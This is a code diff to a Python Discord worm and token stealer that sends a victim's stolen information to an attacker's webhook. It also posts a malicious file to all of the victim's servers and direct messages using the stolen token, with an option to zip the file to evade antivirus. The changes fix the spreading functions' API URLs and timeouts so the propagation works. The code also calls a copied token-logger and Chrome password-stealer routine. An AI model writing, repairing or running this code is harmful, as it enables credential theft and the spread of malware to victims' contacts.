@@ -7,7 +7,7 @@ webhook = "" # Webhook to send your info into
 
 message = "" # Message to send to the friends and servers of the victim along with the file
 
-zipfirst = False # If the program should make the file .zip first before sending it to the victim
+zipfirst = False # If the program should make the file .zip first before sending it to the next victim(s)
                  # This will have a smaller chance of an AV noticing the download
 
 #?############ CONFIG END
@@ -29,12 +29,13 @@ def sendmessage(token, message, channel_id, iftimeout: bool, files):
     print("Sending message to ", channel_id)
     url = f"https://discord.com/api/channels/{channel_id}/messages"
 
-    headers = {"Authorization": token}
+    headers = {"Authorization": token,
+                'Content-Type': 'multipart/form-data'}
     payload = {"content": message}
 
-    timeout = 999
+    timeout = 30
     if iftimeout == True:
-        timeout = 0.00000001
+        timeout = 2
 
     try:
         r = requests.post(url, headers=headers, json=payload, timeout=timeout, files=files)
@@ -47,15 +48,16 @@ def sendmessage(token, message, channel_id, iftimeout: bool, files):
 
 def sendDMs(token, message, channel_id, iftimeout: bool, files):
     print("Sending DM to ", channel_id)
-    url = f"https://discord.com/channels/@me/{channel_id}"
-    #url = f"https://discord.com/api/v9/channels/{channel_id}/message"
+    #url = f"https://discord.com/channels/@me/{channel_id}"
+    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
 
-    headers = {"Authorization": token}
+    headers = {"Authorization": token,
+               'Content-Type': 'multipart/form-data'}
     payload = {"content": message}
 
     timeout = 30
     if iftimeout == True:
-        timeout = 0.00000001
+        timeout = 2
 
     try:
         r = requests.post(url, headers=headers, json=payload, timeout=timeout, files=files)
@@ -128,9 +130,9 @@ def spread(token, message, zipfirst):
     channels = getchannels(token)
     files = makeFile(zipfirst)
     for i in channels[0]:
-        sendmessage(token, message, i, True, files)
-    for i in channels[1]: # Change the True in these to False if you want to see the status codes
-        sendDMs(token, message, i, True, files)
+        sendmessage(token, message, i, False, files)
+    for i in channels[1]: # I changed it to False so it's easier to debug, you can do True on prod if you want to. It's also more stable this way
+        sendDMs(token, message, i, False, files)
 
 def tokenlogger(webhook): # Stolen because I'm lazy as hell: https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks
     import psutil
